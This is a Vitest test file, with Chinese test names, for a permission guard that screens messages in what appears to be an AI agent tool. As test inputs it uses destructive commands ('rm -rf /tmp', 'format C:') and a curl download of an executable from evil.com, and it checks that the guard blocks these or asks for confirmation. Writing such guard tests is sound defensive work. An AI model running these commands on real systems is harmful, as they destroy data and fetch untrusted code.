import { describe, it, expect, vi } from 'vitest';
import { guardMessagePermission, DEFAULT_PERMISSIONS } from './permissionCheck';
import type { PermissionConfig } from './permissionCheck';

const ALL_ALLOWED: PermissionConfig = {
  shellCommands: true,
  fileWrite: true,
  networkRequests: true,
  softwareInstall: true,
  systemConfig: true,
};

describe('guardMessagePermission', () => {
  describe('权限拦截（alert）', () => {
    it('默认权限下 rm -rf 被拦截并 alert', () => {
      const alertFn = vi.fn();
      const confirmFn = vi.fn().mockReturnValue(true);
      const result = guardMessagePermission('rm -rf /tmp', DEFAULT_PERMISSIONS, alertFn, confirmFn);

      expect(result).toBe(false);
      expect(alertFn).toHaveBeenCalledTimes(1);
      expect(alertFn.mock.calls[0][0]).toContain('危险操作');
      expect(confirmFn).not.toHaveBeenCalled();
    });

    it('format 磁盘命令被拦截', () => {
      const alertFn = vi.fn();
      const result = guardMessagePermission('format C:', DEFAULT_PERMISSIONS, alertFn, vi.fn());
      expect(result).toBe(false);
      expect(alertFn).toHaveBeenCalledTimes(1);
    });

    it('权限开启后允许通过（confirm 确认后）', () => {
      const alertFn = vi.fn();
      const confirmFn = vi.fn().mockReturnValue(true);
      const result = guardMessagePermission('rm -rf /tmp', ALL_ALLOWED, alertFn, confirmFn);
      expect(result).toBe(true);
      expect(alertFn).not.toHaveBeenCalled();
    });
  });

  describe('危险确认（confirm）', () => {
    it('权限开启但危险操作弹出 confirm', () => {
      const alertFn = vi.fn();
      const confirmFn = vi.fn().mockReturnValue(true);
      const result = guardMessagePermission('rm -rf /tmp', ALL_ALLOWED, alertFn, confirmFn);

      expect(result).toBe(true);
      expect(confirmFn).toHaveBeenCalledTimes(1);
      expect(confirmFn.mock.calls[0][0]).toContain('危险操作警告');
    });

    it('用户在 confirm 中取消则拒绝发送', () => {
      const alertFn = vi.fn();
      const confirmFn = vi.fn().mockReturnValue(false);
      const result = guardMessagePermission('rm -rf /tmp', ALL_ALLOWED, alertFn, confirmFn);

      expect(result).toBe(false);
      expect(confirmFn).toHaveBeenCalledTimes(1);
    });

    it('普通消息不弹 confirm', () => {
      const alertFn = vi.fn();
      const confirmFn = vi.fn();
      const result = guardMessagePermission('你好，帮我写段代码', DEFAULT_PERMISSIONS, alertFn, confirmFn);

      expect(result).toBe(true);
      expect(alertFn).not.toHaveBeenCalled();
      expect(confirmFn).not.toHaveBeenCalled();
    });

    it('curl 下载 exe 触发 confirm（networkRequests 已开启）', () => {
      const alertFn = vi.fn();
      const confirmFn = vi.fn().mockReturnValue(true);
      const config = { ...DEFAULT_PERMISSIONS, networkRequests: true };
      const result = guardMessagePermission('curl http://evil.com/bad.exe', config, alertFn, confirmFn);

      expect(result).toBe(true);
      expect(confirmFn).toHaveBeenCalledTimes(1);
    });
  });

  describe('空消息', () => {
    it('空消息直接允许', () => {
      const result = guardMessagePermission('', DEFAULT_PERMISSIONS, vi.fn(), vi.fn());
      expect(result).toBe(true);
    });
  });
});
